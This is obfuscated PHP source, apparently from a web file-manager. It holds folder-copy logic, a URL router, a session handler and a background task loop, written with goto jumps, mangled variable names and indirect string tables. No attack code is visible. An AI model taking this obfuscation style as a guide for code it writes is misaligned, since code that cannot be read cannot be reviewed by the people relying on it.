$Cœ†“ù¤âß[$FÅÃ¹¬×·¬[371]] == SourceModel::TYPE_GROUP && $bïÔÄÇ¹[$FÅÃ¹¬×·¬[371]] == SourceModel::TYPE_GROUP && $Cœ†“ù¤âß[$FÅÃ¹¬×·¬[456]] == $bïÔÄÇ¹[$FÅÃ¹¬×·¬[456]]; goto C¶ŒÍÊ…Œò; d‹à‚‹´œŠ: if ($CĞ§Œõƒ¶æ) { $Aßä²‹ù¹º = array($FÅÃ¹¬×·¬[525] => array($FÅÃ¹¬×·¬[483], $Cœ†“ù¤âß[$FÅÃ¹¬×·¬[459]] . $Cœ†“ù¤âß[$FÅÃ¹¬×·¬[369]] . $FÅÃ¹¬×·¬[484])); $aæ·œÂó÷˜ = $Cœ†“ù¤âß[$FÅÃ¹¬×·¬[459]] . $Cœ†“ù¤âß[$FÅÃ¹¬×·¬[369]] . $FÅÃ¹¬×·¬[47]; $aâÀÜŠõ†ï = $bïÔÄÇ¹[$FÅÃ¹¬×·¬[459]] . $bïÔÄÇ¹[$FÅÃ¹¬×·¬[369]] . $FÅÃ¹¬×·¬[47] . $Cœ†“ù¤âß[$FÅÃ¹¬×·¬[369]] . $FÅÃ¹¬×·¬[47]; $dÁÅ‹¿‡‹¡ = array($FÅÃ¹¬×·¬[525] => array($FÅÃ¹¬×·¬[534], "\162\x65\x70\154\x61\x63\x65\x28\x70\x61\x72\x65\x6e\164\114\x65\166\x65\x6c\54\x27{$aæ·œÂó÷˜}\x27\54\x27{$aâÀÜŠõ†ï}\47\51"), $FÅÃ¹¬×·¬[521] => $bïÔÄÇ¹[$FÅÃ¹¬×·¬[371]], $FÅÃ¹¬×·¬[522] => $bïÔÄÇ¹[$FÅÃ¹¬×·¬[456]]); if ($A•»¿ÂÜ™í) { $dÁÅ‹¿‡‹¡[$FÅÃ¹¬×·¬[396]] = 0; } $this->where($Aßä²‹ù¹º)->data($dÁÅ‹¿‡‹¡)->save(); } $this->where(array($FÅÃ¹¬×·¬[383] => $BˆÒĞÎéá))->data($dÊï™ÎêÄÁ)->save(); return $BˆÒĞÎéá; goto d·ãÄà±ˆè; e³Õ¼¤ô¸»: $FÅÃ¹¬×·¬ =& $_SERVER[Æ]; $Cœ†“ù¤âß = $this->sourceInfo($BˆÒĞÎéá); $bïÔÄÇ¹ = $this->sourceInfo($d¡±âÆÄì†); goto fÒ¨øñÁ¹; C¶ŒÍÊ…Œò: if (!$B±æ¨ÓÓí¸) { Model($FÅÃ¹¬×·¬[454])->authClear($BˆÒĞÎéá); } $A•»¿ÂÜ™í = $Cœ†“ù¤âß[$FÅÃ¹¬×·¬[397]] == $FÅÃ¹¬×·¬[83] && $bïÔÄÇ¹[$FÅÃ¹¬×·¬[397]] != $FÅÃ¹¬×·¬[83]; if ($A•»¿ÂÜ™í) { $dÊï™ÎêÄÁ[$FÅÃ¹¬×·¬[396]] = 0; } goto d‹à‚‹´œŠ; d·ãÄà±ˆè: } private function clearShare($f£ôóäº–ï, $b—“×‰àš·) { goto C‚Í—é·–; C‚Í—é·–: $a¥¢ìòÈ´Û =& $_SERVER[Æ]; $e„îáÓËÛ³ = $this->sourceInfo($f£ôóäº–ï); $Fæà¦£óÒä = $this->sourceInfo($b—“×‰àš·); goto aš²¥”¿é; D¾Ò¤Äˆ¾ö: if (!$céá¹ÇËºê) { return; } $c¼’‰ç„Åâ = array($a¥¢ìòÈ´Û[369] => array($a¥¢ìòÈ´Û[7], $céá¹ÇËºê), $a¥¢ìòÈ´Û[448] => 1); $DËÚŒĞ„øÙ = Model($a¥¢ìòÈ´Û[536])->field($a¥¢ìòÈ´Û[441])->where($c¼’‰ç„Åâ)->select(); goto DÀ·³İ¬Ş; bÄÈÜØÛõ¦: Model($a¥¢ìòÈ´Û[536])->where($c¼’‰ç„Åâ)->save(array($a¥¢ìòÈ´Û[448] => 0)); Model($a¥¢ìòÈ´Û[537])->where($c¼’‰ç„Åâ)->delete(); goto EîÀëåÙ»; aš²¥”¿é: if ($e„îáÓËÛ³[$a¥¢ìòÈ´Û[456]] == $Fæà¦£óÒä[$a¥¢ìòÈ´Û[456]] && $e„îáÓËÛ³[$a¥¢ìòÈ´Û[371]] == $a¥¢ìòÈ´Û[535]) { return; } $c¼’‰ç„Åâ = array($a¥¢ìòÈ´Û[459] => array($a¥¢ìòÈ´Û[483], $e„îáÓËÛ³[$a¥¢ìòÈ´Û[459]] . $f£ôóäº–ï . $a¥¢ìòÈ´Û[484])); $céá¹ÇËºê = $this->field($a¥¢ìòÈ´Û[383])->where($c¼’‰ç„Åâ)->getField($a¥¢ìòÈ´Û[369], !0); goto D¾Ò¤Äˆ¾ö; DÀ·³İ¬Ş: if (!$DËÚŒĞ„øÙ) { return; } $DËÚŒĞ„øÙ = array_to_keyvalue($DËÚŒĞ„øÙ, $a¥¢ìòÈ´Û[33], $a¥¢ìòÈ´Û[441]); $c¼’‰ç„Åâ = array($a¥¢ìòÈ´Û[441] => array($a¥¢ìòÈ´Û[7], $DËÚŒĞ„øÙ)); goto bÄÈÜØÛõ¦; EîÀëåÙ»: } public function copyFolderFromIO($A¿˜àÒš…Ä, $dĞ‚†Ä¦êÃ, $fìËö›¶å, $cŒ ›¡·†, $dìÁ”Ü¸Í›, $cŸ“Œ–˜ = false) { goto fÙÑÊîÚÂÈ; aò§ÌÄ‚ô‚: if ($fåÔ¿Ï¨øĞ) { $this->_childrenAllMake($fåÔ¿Ï¨øĞ); } Hook::trigger($FË†ª¶¿ó´[539]); $this->_copyChildTo($A¿˜àÒš…Ä, $dĞ‚†Ä¦êÃ, $eÙÉ’®Ú½©, $cŒ ›¡·†, $eÙº§Æ¾ã¡, $dìÁ”Ü¸Í›); goto d•í–¿„…ˆ; aÀá”¾Í²©: $fåÔ¿Ï¨øĞ = $this->fileNameExist($fìËö›¶å, $f½Œ¾ÕÃ¾ò); $eÙÉ’®Ú½© = $this->mkdir($fìËö›¶å, $f½Œ¾ÕÃ¾ò, $cŒ ›¡·†); if (!$fåÔ¿Ï¨øĞ || $cŒ ›¡·† == REPEAT_RENAME_FOLDER) { $cŒ ›¡·† = !1; } goto aò§ÌÄ‚ô‚; d•í–¿„…ˆ: Hook::trigger($FË†ª¶¿ó´[540]); if ($eÙÉ’®Ú½©) { $this->folderSizeResetChildren($eÙÉ’®Ú½©); } $this->_childrenListClear(); goto A™ÒßÔÓ; BšéŠ´‡â: Model($FË†ª¶¿ó´[422])->linkAdd($eÙº§Æ¾ã¡[$FË†ª¶¿ó´[501]]); Model($FË†ª¶¿ó´[422])->remove($eÙº§Æ¾ã¡[$FË†ª¶¿ó´[538]]); $this->folderSizeReset($fìËö›¶å); goto eù¡¾Â‡À; A™ÒßÔÓ: Model($FË†ª¶¿ó´[504])->addAll($eÙº§Æ¾ã¡[$FË†ª¶¿ó´[502]], array(), !0); Model($FË†ª¶¿ó´[505])->eventCopy($eÙÉ’®Ú½©); $this->saveAll($eÙº§Æ¾ã¡[$FË†ª¶¿ó´[503]]); goto BšéŠ´‡â; fÙÑÊîÚÂÈ: $FË†ª¶¿ó´ =& $_SERVER[Æ]; $eÙº§Æ¾ã¡ = array($FË†ª¶¿ó´[502] => array(), $FË†ª¶¿ó´[503] => array(), $FË†ª¶¿ó´[501] => array(), $FË†ª¶¿ó´[538] => array()); $f½Œ¾ÕÃ¾ò = $cŸ“Œ–˜ ? $cŸ“Œ–˜ : $A¿˜àÒš…Ä->getPathName($A¿˜àÒš…Ä->pathThis($dĞ‚†Ä¦êÃ)); goto aÀá”¾Í²©; eù¡¾Â‡À: $this->updateModifyTime($fìËö›¶å); return $eÙÉ’®Ú½©; goto b»Ÿºò˜ß; b»Ÿºò˜ß: } private function _copyChildTo($a™¾ÁÍß±, $d°ÔÀø¥†, $Eò÷òİöê„, $Bª„¸åÃ, &$dŸö×·¾Ù—, $bºù¸ë£ò¶) { goto C™£™Ù–¨; F­ø½ˆî: $Dæ†ÑŠ­î» = $this->_childrenList($Eò÷òİöê„); $Dæ†ÑŠ­î» = array_to_keyvalue($Dæ†ÑŠ­î», $B†§”’áÄ[28]); foreach ($cŒôªÁ™…‡ as $cÇ¦‡Œ ßˆ) { $e¹ìˆ¶†öâ = $Dæ†ÑŠ­î»[$cÇ¦‡Œ ßˆ[$B†§”’áÄ[28]]]; $A‘×Œ‘³…½ = $e¹ìˆ¶†öâ[$B†§”’áÄ[369]]; $this->_copyApplyMeta($e¹ìˆ¶†öâ, $dŸö×·¾Ù—); if ($cÇ¦‡Œ ßˆ[$B†§”’áÄ[29]] == $B†§”’áÄ[76]) { $cÇ¦‡Œ ßˆ[$B†§”’áÄ[75]] = $a™¾ÁÍß±->getPathInner($cÇ¦‡Œ ßˆ[$B†§”’áÄ[75]]); $this->_copyChildTo($a™¾ÁÍß±, $cÇ¦‡Œ ßˆ[$B†§”’áÄ[75]], $A‘×Œ‘³…½, $Bª„¸åÃ, $dŸö×·¾Ù—, $bºù¸ë£ò¶); } } goto aÏ“ÄŠ«º±; e´ù‹ºí÷: foreach ($cŒôªÁ™…‡ as &$cÇ¦‡Œ ßˆ) { goto eíİ—”ÈÎ¥; eíİ—”ÈÎ¥: if (isset($EĞ¶Ë´‚×[$cÇ¦‡Œ ßˆ[$B†§”’áÄ[28]]])) { $cÇ¦‡Œ ßˆ = $EĞ¶Ë´‚×[$cÇ¦‡Œ ßˆ[$B†§”’áÄ[28]]]; } $cÇ¦‡Œ ßˆ[$B†§”’áÄ[370]] = $cÇ¦‡Œ ßˆ[$B†§”’áÄ[29]] == $B†§”’áÄ[76]; $cÇ¦‡Œ ßˆ[$B†§”’áÄ[372]] = _get($cÇ¦‡Œ ßˆ, $B†§”’áÄ[160], $B†§”’áÄ[33]); goto c“–È‰˜ïÓ; EÎõ¿«¸šœ: if ($Bª„¸åÃ) { $fãÛ©Ì¥„î = $this->fileNameExistCache($Eò÷òİöê„, $cÇ¦‡Œ ßˆ[$B†§”’áÄ[28]]); if ($fãÛ©Ì¥„î) { if ($cÇ¦‡Œ ßˆ[$B†§”’áÄ[370]] || $Bª„¸åÃ == REPEAT_SKIP) { continue; } if ($Bª„¸åÃ == REPEAT_REPLACE) { $e¹ìˆ¶†öâ = $this->sourceInfoCache($fãÛ©Ì¥„î); $CÃòœ©Ì³ = $this->fileHistory($e¹ìˆ¶†öâ, $cÇ¦‡Œ ßˆ[$B†§”’áÄ[419]], $cÇ¦‡Œ ßˆ[$B†§”’áÄ[77]]); if ($CÃòœ©Ì³) { $dŸö×·¾Ù—[$B†§”’áÄ[501]][] = $cÇ¦‡Œ ßˆ[$B†§”’áÄ[419]]; } continue; } else { if ($Bª„¸åÃ == REPEAT_RENAME) { $cÇ¦‡Œ ßˆ[$B†§”’áÄ[28]] = $this->fileNameAutoCache($Eò÷òİöê„, $cÇ¦‡Œ ßˆ[$B†§”’áÄ[28]], $Bª„¸åÃ, !1); } } } } if (!$cÇ¦‡Œ ßˆ[$B†§”’áÄ[370]] && $cÇ¦‡Œ ßˆ[$B†§”’áÄ[419]]) { $dŸö×·¾Ù—[$B†§”’áÄ[501]][] = $cÇ¦‡Œ ßˆ[$B†§”’áÄ[419]]; } $B–÷Œöá÷ß[] = $this->_makeItemData($cÇ¦‡Œ ßˆ, $Fß±¡áµºß, $cÇ¦‡Œ ßˆ[$B†§”’áÄ[28]]); goto C’”°°Ñ±; c“–È‰˜ïÓ: $cÇ¦‡Œ ßˆ[$B†§”’áÄ[77]] = _get($cÇ¦‡Œ ßˆ, $B†§”’áÄ[77], 0); $cÇ¦‡Œ ßˆ[$B†§”’áÄ[419]] = _get($cÇ¦‡Œ ßˆ, $B†§”’áÄ[419], 0); if (!isset($cÇ¦‡Œ ßˆ[$B†§”’áÄ[541]]) && $cÇ¦‡Œ ßˆ[$B†§”’áÄ[419]]) { $dŸö×·¾Ù—[$B†§”’áÄ[538]][] = $cÇ¦‡Œ ßˆ[$B†§”’áÄ[419]]; } goto EÎõ¿«¸šœ; C’”°°Ñ±: } unset($cÇ¦‡Œ ßˆ); if (!empty($B–÷Œöá÷ß)) { $this->addAll($B–÷Œöá÷ß); } goto F­ø½ˆî; cˆíËŠÀ: $cŒôªÁ™…‡ = array_merge($A•¶³¯‰¤Î[$B†§”’áÄ[73]], $A•¶³¯‰¤Î[$B†§”’áÄ[74]]); $EĞ¶Ë´‚× = $this->_addFiles($a™¾ÁÍß±, $A•¶³¯‰¤Î[$B†§”’áÄ[73]], $bºù¸ë£ò¶); $B–÷Œöá÷ß = array(); goto e´ù‹ºí÷; C™£™Ù–¨: $B†§”’áÄ =& $_SERVER[Æ]; $Fß±¡áµºß = $this->sourceInfoCache($Eò÷òİöê„); $A•¶³¯‰¤Î = $a™¾ÁÍß±->listPath($d°ÔÀø¥†, !1, !0); goto cˆíËŠÀ; aÏ“ÄŠ«º±: } private function _addFiles($cŸ¿åÊ¡î, $EŒÀšõ™ª, $C·£©Ö„¿²) { goto F‚Í‚í „; eäæíÒ»•: $f¯Ã»Ëõó = $e¶“¦ÔÌŒ->where($CÀÈŞ¥“¶‡)->select(); $f¯Ã»Ëõó = $f¯Ã»Ëõó ? $f¯Ã»Ëõó : array(); foreach ($f¯Ã»Ëõó as $f£¬¦¤®ö) { if (!isset($fî‰ÀóÙîÅ[$f£¬¦¤®ö[$DÛÁ…À°¦™[163]]])) { continue; } $FâñÀ¾· = $fî‰ÀóÙîÅ[$f£¬¦¤®ö[$DÛÁ…À°¦™[163]]]; foreach ($FâñÀ¾· as &$e»ë·¸§ª¢) { $e»ë·¸§ª¢[$DÛÁ…À°¦™[419]] = $f£¬¦¤®ö[$DÛÁ…À°¦™[419]]; $e»ë·¸§ª¢[$DÛÁ…À°¦™[541]] = !0; } unset($e»ë·¸§ª¢); } goto E‡ê²õóå; F‚Í‚í „: $DÛÁ…À°¦™ =& $_SERVER[Æ]; if (!$EŒÀšõ™ª || count($EŒÀšõ™ª) == 0) { return array(); } $fî‰ÀóÙîÅ = array(); goto F÷ò•êè—°; fˆóŒˆà†–: return $A¤­ë¶Èå¾; goto dôÔğ–µ®; E‡ê²õóå: $F¦Ë—è»ÙÚ = array(); foreach ($EŒÀšõ™ª as $C’×¾¨¼‚é) { if (isset($C’×¾¨¼‚é[$DÛÁ…À°¦™[541]]) && $C’×¾¨¼‚é[$DÛÁ…À°¦™[541]]) { continue; } $DÚÍÑƒ‡’ = $cŸ¿åÊ¡î->getPathInner($C’×¾¨¼‚é[$DÛÁ…À°¦™[75]]); $aÅØ±‹é¡Î = $e¶“¦ÔÌŒ->addFileMake($DÚÍÑƒ‡’, $C’×¾¨¼‚é[$DÛÁ…À°¦™[77]], $C’×¾¨¼‚é[$DÛÁ…À°¦™[164]], $C’×¾¨¼‚é[$DÛÁ…À°¦™[163]], $C’×¾¨¼‚é[$DÛÁ…À°¦™[28]], $C·£©Ö„¿²); $F¦Ë—è»ÙÚ[] = $aÅØ±‹é¡Î; } $e¶“¦ÔÌŒ->addAll($F¦Ë—è»ÙÚ); goto E¥£öÉ›İ; aô—×ßÏÏÖ: foreach ($f¯Ã»Ëõó as $f£¬¦¤®ö) { if (!isset($fî‰ÀóÙîÅ[$f£¬¦¤®ö[$DÛÁ…À°¦™[163]]])) { continue; } $f ‰ÔŠè³‡ =& $fî‰ÀóÙîÅ[$f£¬¦¤®ö[$DÛÁ…À°¦™[163]]]; foreach ($f ‰ÔŠè³‡ as &$e»ë·¸§ª¢) { $e»ë·¸§ª¢[$DÛÁ…À°¦™[419]] = $f£¬¦¤®ö[$DÛÁ…À°¦™[419]]; } unset($e»ë·¸§ª¢); } $A¤­ë¶Èå¾ = array(); foreach ($EŒÀšõ™ª as $d§ƒÒÑéÅë) { $A¤­ë¶Èå¾[$d§ƒÒÑéÅë[$DÛÁ…À°¦™[28]]] = $d§ƒÒÑéÅë; } goto fˆóŒˆà†–; F÷ò•êè—°: foreach ($EŒÀšõ™ª as &$e»ë·¸§ª¢) { goto fÚŠÅ ùÁº; bç˜ê­©ù: if (count($fî‰ÀóÙîÅ[$b´‹…¬ÓÜ]) > 1) { $e»ë·¸§ª¢[$DÛÁ…À°¦™[541]] = !0; } goto a±Šº‘‘ÚÍ; bø…×°å¹Å: $e»ë·¸§ª¢[$DÛÁ…À°¦™[163]] = $b´‹…¬ÓÜ; Hook::trigger($DÛÁ…À°¦™[543], $e»ë·¸§ª¢); $fî‰ÀóÙîÅ[$b´‹…¬ÓÜ][] =& $e»ë·¸§ª¢; goto bç˜ê­©ù; fÚŠÅ ùÁº: Hook::trigger($DÛÁ…À°¦™[542], $e»ë·¸§ª¢); $e»ë·¸§ª¢[$DÛÁ…À°¦™[75]] = $cŸ¿åÊ¡î->getPathInner($e»ë·¸§ª¢[$DÛÁ…À°¦™[75]]); $Fµ‚Ïé˜® = $cŸ¿åÊ¡î->hashSimple($e»ë·¸§ª¢[$DÛÁ…À°¦™[75]]); goto DÍ›Ê››²Œ; DÍ›Ê››²Œ: $b´‹…¬ÓÜ = $cŸ¿åÊ¡î->hashMd5($e»ë·¸§ª¢[$DÛÁ…À°¦™[75]]); if (strlen($b´‹…¬ÓÜ) > 10 && !isset($fî‰ÀóÙîÅ[$b´‹…¬ÓÜ])) { $fî‰ÀóÙîÅ[$b´‹…¬ÓÜ] = array(); } $e»ë·¸§ª¢[$DÛÁ…À°¦™[164]] = $Fµ‚Ïé˜®; goto bø…×°å¹Å; a±Šº‘‘ÚÍ: } $CÀÈŞ¥“¶‡ = array($DÛÁ…À°¦™[163] => array($DÛÁ…À°¦™[7], array_keys($fî‰ÀóÙîÅ))); $e¶“¦ÔÌŒ = Model($DÛÁ…À°¦™[544]); goto eäæíÒ»•; E¥£öÉ›İ: $CÀÈŞ¥“¶‡ = array($DÛÁ…À°¦™[163] => array($DÛÁ…À°¦™[7], array_keys($fî‰ÀóÙîÅ))); $f¯Ã»Ëõó = $e¶“¦ÔÌŒ->where($CÀÈŞ¥“¶‡)->select(); $f¯Ã»Ëõó = $f¯Ã»Ëõó ? $f¯Ã»Ëõó : array(); goto aô—×ßÏÏÖ; dôÔğ–µ®: } } define($_SERVER[Æ][545], $_SERVER[Æ][546]); goto eçë‘†áè; a¦Áœ™: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\x79" => "\133\x5e\x2f\x5d\x2b", "\72\156\165\155" => "\133\x30\55\x39\135\x2b", "\x3a\141\154\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($Eæ¡“ëéÈ, $C¶Ÿò™‡) { $E¶Ò¥…¿Šõ =& $_SERVER[Æ]; if ($Eæ¡“ëéÈ == $E¶Ò¥…¿Šõ[1383]) { $BÚëßé¼ã = array_map($E¶Ò¥…¿Šõ[1384], $C¶Ÿò™‡[0]); $bÖñô·ë¾ß = strpos($C¶Ÿò™‡[1], $E¶Ò¥…¿Šõ[8]) === 0 ? $C¶Ÿò™‡[1] : $E¶Ò¥…¿Šõ[8] . $C¶Ÿò™‡[1]; $d¸ºôª¦ŸÜ = $C¶Ÿò™‡[2]; } else { $BÚëßé¼ã = null; $bÖñô·ë¾ß = strpos($C¶Ÿò™‡[0], $E¶Ò¥…¿Šõ[8]) === 0 ? $C¶Ÿò™‡[0] : $E¶Ò¥…¿Šõ[8] . $C¶Ÿò™‡[0]; $d¸ºôª¦ŸÜ = $C¶Ÿò™‡[1]; } array_push(self::$maps, $BÚëßé¼ã); array_push(self::$routes, $bÖñô·ë¾ß); array_push(self::$methods, strtoupper($Eæ¡“ëéÈ)); array_push(self::$callbacks, $d¸ºôª¦ŸÜ); } public static function error($AåèàÈ©Û”) { self::$errorCallback = $AåèàÈ©Û”; } public static function haltOnMatch($cé¨»¥Œ¾Õ = true) { self::$halts = $cé¨»¥Œ¾Õ; } public static function dispatch() { goto B°‘«„§à×; cšÏÙá®É: self::$routes = preg_replace($d•Š¬ÄİÙ‚[1073], $d•Š¬ÄİÙ‚[8], self::$routes); if (in_array($F•ñÀ®ì³÷, self::$routes)) { $e¯¥ô¨ = array_keys(self::$routes, $F•ñÀ®ì³÷); foreach ($e¯¥ô¨ as $D™ÌÊíö¢) { if (self::$methods[$D™ÌÊíö¢] == $B™ÚÄ¸ùÏ || self::$methods[$D™ÌÊíö¢] == $d•Š¬ÄİÙ‚[1386] || in_array($B™ÚÄ¸ùÏ, self::$maps[$D™ÌÊíö¢])) { $AÚ‰ £Ïì = !0; if (!is_object(self::$callbacks[$D™ÌÊíö¢])) { $b¸¹êÙ†Ø‘ = explode($d•Š¬ÄİÙ‚[8], self::$callbacks[$D™ÌÊíö¢]); $e«éƒœ•„Ç = end($b¸¹êÙ†Ø‘); $DÎ³×ßÁîï = explode($d•Š¬ÄİÙ‚[1387], $e«éƒœ•„Ç); $B¿î³Äá×Ò = new $DÎ³×ßÁîï[0](); $B¿î³Äá×Ò->{$DÎ³×ßÁîï[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$D™ÌÊíö¢]); if (self::$halts) { return; } } } } } else { $aµ‹à¿–Œè = 0; foreach (self::$routes as $D™ÌÊíö¢) { if (strpos($D™ÌÊíö¢, $d•Š¬ÄİÙ‚[4]) !== !1) { $D™ÌÊíö¢ = str_replace($a—Ó¢ÜÜìÔ, $A›—çÙŒ¦÷, $D™ÌÊíö¢); } if (preg_match($d•Š¬ÄİÙ‚[1388] . $D™ÌÊíö¢ . $d•Š¬ÄİÙ‚[1389], $F•ñÀ®ì³÷, $Bò±‹ˆç…)) { if (self::$methods[$aµ‹à¿–Œè] == $B™ÚÄ¸ùÏ || self::$methods[$aµ‹à¿–Œè] == $d•Š¬ÄİÙ‚[1386] || !empty(self::$maps[$aµ‹à¿–Œè]) && in_array($B™ÚÄ¸ùÏ, self::$maps[$aµ‹à¿–Œè])) { $AÚ‰ £Ïì = !0; array_shift($Bò±‹ˆç…); if (!is_object(self::$callbacks[$aµ‹à¿–Œè])) { $b¸¹êÙ†Ø‘ = explode($d•Š¬ÄİÙ‚[8], self::$callbacks[$aµ‹à¿–Œè]); $e«éƒœ•„Ç = end($b¸¹êÙ†Ø‘); $DÎ³×ßÁîï = explode($d•Š¬ÄİÙ‚[1387], $e«éƒœ•„Ç); $B¿î³Äá×Ò = new $DÎ³×ßÁîï[0](); if (!method_exists($B¿î³Äá×Ò, $DÎ³×ßÁîï[1])) { echo $d•Š¬ÄİÙ‚[1390]; } else { call_user_func_array(array($B¿î³Äá×Ò, $DÎ³×ßÁîï[1]), $Bò±‹ˆç…); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$aµ‹à¿–Œè], $Bò±‹ˆç…); if (self::$halts) { return; } } } } $aµ‹à¿–Œè++; } } if ($AÚ‰ £Ïì == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Aç°êĞˆÕ =& $_SERVER[Æ]; header($_SERVER[$Aç°êĞˆÕ[1391]] . $Aç°êĞˆÕ[1392]); echo $Aç°êĞˆÕ[1393]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$d•Š¬ÄİÙ‚[1385]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto cŞó¨Ô’; B°‘«„§à×: $d•Š¬ÄİÙ‚ =& $_SERVER[Æ]; $F•ñÀ®ì³÷ = parse_url($_SERVER[$d•Š¬ÄİÙ‚[1385]], PHP_URL_PATH); $B™ÚÄ¸ùÏ = $_SERVER[$d•Š¬ÄİÙ‚[154]]; goto eÀìò”Ñ–§; eÀìò”Ñ–§: $a—Ó¢ÜÜìÔ = array_keys(static::$patterns); $A›—çÙŒ¦÷ = array_values(static::$patterns); $AÚ‰ £Ïì = !1; goto cšÏÙá®É; cŞó¨Ô’: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto d°Ó­Şõ¯´; d¤éˆçœ÷ì: switch ($Eó—ßù½İŞ) { case $eÕ‚§ªÖË[17]: self::$handle = Model($eÕ‚§ªÖË[754]); break; case $eÕ‚§ªÖË[755]: self::$handle = new CacheRedis($D¶í³¡Ç”‡, $DˆÏ®Ù·­ë); break; case $eÕ‚§ªÖË[756]: self::$handle = new CacheMemcached($D¶í³¡Ç”‡, $DˆÏ®Ù·­ë); break; case $eÕ‚§ªÖË[167]: $D¶í³¡Ç”‡[$eÕ‚§ªÖË[75]] = $D¶í³¡Ç”‡[$eÕ‚§ªÖË[75]] . $eÕ‚§ªÖË[1397]; self::$handle = new CacheFile($D¶í³¡Ç”‡, $DˆÏ®Ù·­ë); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $EÈƒÜ¤œ§— = new self(); goto eÅïöŠİøµ; B¼‚‡í‚…: $Eó—ßù½İŞ = $f†ËÇ´ÇöÁ[$eÕ‚§ªÖË[1396]]; $D¶í³¡Ç”‡ = $f†ËÇ´ÇöÁ[$Eó—ßù½İŞ]; $DˆÏ®Ù·­ë = $f†ËÇ´ÇöÁ[$eÕ‚§ªÖË[753]]; goto d¤éˆçœ÷ì; A†Õì¸™¿: $c‹Õ·ßÃ¯Ç = _get($GLOBALS, $eÕ‚§ªÖË[1395], $c‹Õ·ßÃ¯Ç); if (self::$sessionSign) { } else { if (Cookie::get($c‹Õ·ßÃ¯Ç)) { self::$sessionSign = Cookie::get($c‹Õ·ßÃ¯Ç); } else { self::$sessionSign = guid(); } } Cookie::setSafe($c‹Õ·ßÃ¯Ç, self::$sessionSign, self::$sessionTime); goto B¼‚‡í‚…; eÅïöŠİøµ: return $EÈƒÜ¤œ§—; goto fõöÑ• ‡; d°Ó­Şõ¯´: $eÕ‚§ªÖË =& $_SERVER[Æ]; static $EÈƒÜ¤œ§— = false; if ($EÈƒÜ¤œ§—) { return $EÈƒÜ¤œ§—; } goto F””—±°è; F””—±°è: $f†ËÇ´ÇöÁ = $GLOBALS[$eÕ‚§ªÖË[6]][$eÕ‚§ªÖË[337]]; self::$sessionTime = $f†ËÇ´ÇöÁ[$eÕ‚§ªÖË[1394]]; $c‹Õ·ßÃ¯Ç = SESSION_ID; goto A†Õì¸™¿; fõöÑ• ‡: } public static function sign($CµÙåÁÃæá = false) { $CµÙåÁÃæá && (self::$sessionSign = $CµÙåÁÃæá); self::init(); return self::$sessionSign; } public static function set($CŠùèÌï¹Š, $féÊ·æ” = false) { self::init(); if (is_array($CŠùèÌï¹Š)) { foreach ($CŠùèÌï¹Š as $F”ç®³Ğò => $CâŸ®åŸ±) { array_set_value(self::$data, $F”ç®³Ğò, $CâŸ®åŸ±); } } else { array_set_value(self::$data, $CŠùèÌï¹Š, $féÊ·æ”); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($C–µèŸÄç— = false) { self::init(); if (!$C–µèŸÄç—) { return self::$data; } return array_get_value(self::$data, $C–µèŸÄç—); } public static function remove($d¡†íÕóƒÇ) { self::init(); unset(self::$data[$d¡†íÕóƒÇ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Æ][758])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto E¬Ÿƒ¢‚°İ; E¬Ÿƒ¢‚°İ: $Bíõ—æí =& $_SERVER[Æ]; if (self::valueGet($Bíõ—æí[687]) != $Bíõ—æí[83]) { return; } if (self::valueGet($Bíõ—æí[1398]) == $Bíõ—æí[83]) { $EŞÑš›ƒô¼ = self::valueGet($Bíõ—æí[1399]); if (time() - $EŞÑš›ƒô¼ > 3600 * 2) { self::restart(); } return; } goto b¤·ÂˆÁÍ¦; f†ã×§Š™Ÿ: while (!0) { self::cacheClear(); if (self::valueGet($Bíõ—æí[687]) != $Bíõ—æí[83]) { self::valueSet($Bíõ—æí[1398], $Bíõ—æí[468]); self::log($Bíõ—æí[1402]); die; } self::valueSet($Bíõ—æí[1398], $Bíõ—æí[83]); self::valueSet($Bíõ—æí[1399], time()); self::taskRunAll(); sleep(self::valueGet($Bíõ—æí[1403])); } goto D’ôíà³Œ‡; b¤·ÂˆÁÍ¦: http_close(); self::valueSet($Bíõ—æí[1398], $Bíõ—æí[83]); Hook::bind($Bíõ—æí[1400], $Bíõ—æí[1401]); goto f†ã×§Š™Ÿ; D’ôíà³Œ‡: } public static function restart() { $EÉÀ¡ÅÍ¯ï =& $_SERVER[Æ]; http_close(); self::valueSet($EÉÀ¡ÅÍ¯ï[687], $EÉÀ¡ÅÍ¯ï[468]); sleep(self::valueGet($EÉÀ¡ÅÍ¯ï[1403]) + 5); self::valueSet($EÉÀ¡ÅÍ¯ï[1398], $EÉÀ¡ÅÍ¯ï[468]); self::valueSet($EÉÀ¡ÅÍ¯ï[687], $EÉÀ¡ÅÍ¯ï[83]); } public static function shutdownEvent() { $Cƒ¯†ß³»Í =& $_SERVER[Æ]; self::valueSet($Cƒ¯†ß³»Í[1398], $Cƒ¯†ß³»Í[468]); self::log($Cƒ¯†ß³»Í[1404]); } public static function config($D‹‘®åÒĞ¶, $cïö×§Ü½İ) { $A£­×ªÉèì =& $_SERVER[Æ]; $cÌí’¯¦‡Ğ = 20; $cïö×§Ü½İ = intval($cïö×§Ü½İ) <= $cÌí’¯¦‡Ğ ? $cÌí’¯¦‡Ğ : intval($cïö×§Ü½İ); self::valueSet($A£­×ªÉèì[687], $D‹‘®åÒĞ¶); self::valueSet($A£­×ªÉèì[1403], $cïö×§Ü½İ); 